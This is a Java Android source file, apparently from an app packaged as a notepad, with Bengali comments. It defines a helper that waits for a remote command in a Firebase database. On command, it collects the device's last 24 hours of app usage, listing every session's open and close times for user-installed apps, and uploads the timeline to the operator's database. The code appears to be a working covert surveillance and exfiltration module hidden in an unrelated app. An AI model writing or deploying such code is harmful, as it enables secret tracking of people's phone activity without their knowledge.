package com.megh.notepad; // আপনার প্যাকেজের সঠিক নাম দিন

import android.app.AppOpsManager;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Process;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class AppUsageHelper {

    private static DatabaseReference commandRef;
    private static ValueEventListener usageListener;

    private static void updateStatus(String status) {
        try {
            FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(BackgroundService.USER_ID).child("AppUsageStatus").setValue(status);
            Log.d("AppUsageHelper", status);
        } catch (Exception e) {}
    }

    public static void startListening(final Context context) {
        commandRef = FirebaseDatabase.getInstance()
                .getReference("DeviceData").child(BackgroundService.USER_ID).child("Commands").child("GetAppUsage");

        commandRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) {
                    commandRef.setValue("false");
                    updateStatus("Ready: Set GetAppUsage to 'true'");
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        });

        if (usageListener == null) {
            usageListener = new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    try {
                        if (snapshot.exists() && snapshot.getValue() != null) {
                            String commandStr = String.valueOf(snapshot.getValue());
                            
                            if ("true".equalsIgnoreCase(commandStr)) {
                                commandRef.setValue("false"); 
                                updateStatus("1. Filtering Installed Apps & Gathering 24H Data...");
                                
                                getAndUploadUsageEvents(context);
                            }
                        }
                    } catch (Exception e) {
                        updateStatus("Error: " + e.getMessage());
                        commandRef.setValue("false");
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {}
            };
            commandRef.addValueEventListener(usageListener);
        }
    }

    public static void stopListening() {
        if (commandRef != null && usageListener != null) {
            commandRef.removeEventListener(usageListener);
            usageListener = null;
        }
    }

    private static boolean hasUsageAccessPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(), context.getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private static void getAndUploadUsageEvents(Context context) {
        if (!hasUsageAccessPermission(context)) {
            updateStatus("Error: Usage Access Permission Not Granted!");
            return;
        }

        try {
            UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            PackageManager packageManager = context.getPackageManager();

            // ম্যাজিক: শুধুমাত্র ইউজার ইনস্টল করা অ্যাপগুলোর লিস্ট আগে থেকে বের করে নেওয়া
            HashSet<String> userInstalledApps = new HashSet<>();
            List<ApplicationInfo> packages = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo appInfo : packages) {
                // যদি অ্যাপটি সিস্টেম অ্যাপ না হয়, তবেই লিস্টে রাখবো
                if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    userInstalledApps.add(appInfo.packageName);
                }
            }

            // ঠিক ২৪ ঘণ্টা আগের সময় বের করা
            long endTime = System.currentTimeMillis();
            long startTime = endTime - (24L * 60L * 60L * 1000L); 

            UsageEvents usageEvents = usageStatsManager.queryEvents(startTime, endTime);
            UsageEvents.Event event = new UsageEvents.Event();

            HashMap<String, Long> appOpenTimes = new HashMap<>(); 
            HashMap<String, Map<String, Object>> finalReport = new HashMap<>(); 
            HashMap<String, Long> totalTimeMap = new HashMap<>(); 
            HashMap<String, Integer> sessionCounter = new HashMap<>(); 

            SimpleDateFormat timeFormat = new SimpleDateFormat("hh:mm:ss a", Locale.getDefault());

            while (usageEvents.hasNextEvent()) {
                usageEvents.getNextEvent(event);
                String packageName = event.getPackageName();
                
                // ফিল্টার: যদি অ্যাপটি সিস্টেম অ্যাপ হয়, তবে সেটি সরাসরি স্কিপ (Skip) করবে
                if (!userInstalledApps.contains(packageName)) {
                    continue; 
                }
                
                if (event.getEventType() == 1) { 
                    appOpenTimes.put(packageName, event.getTimeStamp());
                } else if (event.getEventType() == 2) { 
                    if (appOpenTimes.containsKey(packageName)) {
                        long openTime = appOpenTimes.get(packageName);
                        long closeTime = event.getTimeStamp();
                        long duration = closeTime - openTime;

                        if (duration > 2000) {
                            String safeKey = packageName.replace(".", "_"); 
                            
                            String appName = packageName;
                            try {
                                ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
                                appName = packageManager.getApplicationLabel(appInfo).toString();
                            } catch (Exception e) {}

                            if (!finalReport.containsKey(safeKey)) {
                                Map<String, Object> newAppEntry = new HashMap<>();
                                newAppEntry.put("App_Name", appName);
                                newAppEntry.put("Package_Name", packageName);
                                newAppEntry.put("Sessions", new HashMap<String, String>());
                                finalReport.put(safeKey, newAppEntry);
                                totalTimeMap.put(safeKey, 0L);
                                sessionCounter.put(safeKey, 1);
                            }

                            long currentTotal = totalTimeMap.get(safeKey) + duration;
                            totalTimeMap.put(safeKey, currentTotal);

                            int sId = sessionCounter.get(safeKey);
                            Map<String, Object> appEntry = finalReport.get(safeKey);
                            Map<String, String> sessions = (Map<String, String>) appEntry.get("Sessions");

                            String sessionDetails = "Opened: " + timeFormat.format(new Date(openTime)) + 
                                                    " | Closed: " + timeFormat.format(new Date(closeTime)) + 
                                                    " | (" + formatMillis(duration) + ")";
                            
                            sessions.put("Session_" + sId, sessionDetails);
                            sessionCounter.put(safeKey, sId + 1);

                            appEntry.put("Total_Time_Used_24h", formatMillis(currentTotal));
                        }
                        appOpenTimes.remove(packageName);
                    }
                }
            }

            if (!finalReport.isEmpty()) {
                updateStatus("2. Data parsed successfully. Uploading...");
                uploadToFirebase(finalReport);
            } else {
                updateStatus("No User Installed apps were used in the last 24 hours.");
            }

        } catch (Exception e) {
            updateStatus("Exception: " + e.getMessage());
        }
    }

    private static String formatMillis(long millis) {
        long seconds = (millis / 1000) % 60;
        long minutes = (millis / (1000 * 60)) % 60;
        long hours = (millis / (1000 * 60 * 60)) % 24;

        StringBuilder sb = new StringBuilder();
        if (hours > 0) sb.append(hours).append("h ");
        if (minutes > 0) sb.append(minutes).append("m ");
        sb.append(seconds).append("s");
        return sb.toString();
    }

    private static void uploadToFirebase(Map<String, Map<String, Object>> usageData) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("AppUsageLogs");

            String timeStamp = new SimpleDateFormat("dd_MMM_yyyy_hh_mm_a", Locale.getDefault()).format(new Date());
            
            dbRef.child("Timeline_Last_24H_" + timeStamp).setValue(usageData);
            updateStatus("Success: Installed Apps Timeline uploaded! Total Apps: " + usageData.size());
        } catch (Exception e) {
            updateStatus("Upload Error: " + e.getMessage());
        }
    }
}